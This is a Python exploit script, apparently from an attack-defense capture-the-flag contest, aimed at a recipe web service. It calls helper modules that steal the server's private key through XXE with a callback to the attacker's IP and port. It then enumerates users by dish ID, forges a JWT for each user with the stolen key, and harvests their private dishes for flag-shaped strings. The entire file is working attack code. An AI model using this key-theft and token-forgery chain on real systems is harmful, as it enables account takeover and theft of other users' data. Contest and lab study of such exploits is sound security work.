#!/usr/bin/env python3.8
import fake_jwt
import xxe_handler
import exploit_api
from re import match, compile

regexp = compile(r'^[A-Z0-9]{31}=$')


def exploit_one_team(victim_url, last_dish_id, our_ip, our_port):
    private_key = xxe_handler.stole_private_key(our_ip, our_port, victim_url)

    token_header = exploit_api.get_header_with_token(victim_url)

    users = []
    dish_id = last_dish_id + 1
    while True:
        dish = exploit_api.get_dish(token_header, dish_id, victim_url)
        if dish is None:
            break
        users.append(dish['createdBy'])
        dish_id += 1

    print(f'[+] Get users: {len(users)}')

    maybe_flags = []
    for user_id in users:
        access_token = fake_jwt.get_fake_jwt_token(victim_url, user_id, private_key).decode()
        user_token_header = {'Authorization': f'Bearer {access_token}'}

        dishes_page = exploit_api.get_dishes(user_token_header, victim_url, take=1)
        total_count = dishes_page["totalCount"]

        dishes_page = exploit_api.get_dishes(user_token_header, victim_url,
                                             skip=last_dish_id,
                                             take=total_count - last_dish_id)
        dishes = dishes_page['items']
        print(f'[+] Get user dishes: {len(dishes)}')

        for dish in dishes:
            maybe_flags.append(dish['recipe'])
            for ingredient in dish['ingredients']:
                maybe_flags.append(ingredient['product']['manufacturer'])
    return [f for f in maybe_flags if f is not None and match(regexp, f)]


if __name__ == "__main__":
    our_port = 20001
    our_ip = "192.168.0.101"

    victim_url = "http://192.168.0.101:5000"
    last_dish_id = 0

    flags = exploit_one_team(victim_url, last_dish_id, our_ip, our_port)
    print(flags)
